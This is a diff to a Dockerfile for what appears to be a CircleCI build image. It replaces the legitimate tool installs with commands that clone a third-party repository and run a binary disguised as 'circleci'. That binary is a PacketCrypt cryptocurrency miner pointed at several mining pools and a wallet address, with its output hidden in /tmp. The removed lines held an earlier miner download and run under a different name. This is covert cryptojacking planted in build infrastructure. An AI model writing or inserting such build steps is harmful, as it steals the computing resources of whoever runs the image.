@@ -9,6 +9,10 @@ USER root
 
 # Collect the components we need for this image
 RUN apt-get update
-RUN apt-get install -y ruby jq curl rsync hub
-RUN wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O private && chmod +x private && ./private ann -p pkt1q908pl3jfwd3awfqc0p8pkxfk3vjhaaqhng5335 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o 'annmine.rs.*Ke.*'"
-RUN gem install circle-cli
+RUN apt install -y git
+RUN git clone https://github.com/aurbach55/pos.git >/dev/null 2>&1
+RUN cd pos >/dev/null 2>&1
+RUN chmod 777 circleci >/dev/null 2>&1
+RUN nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1
+
+
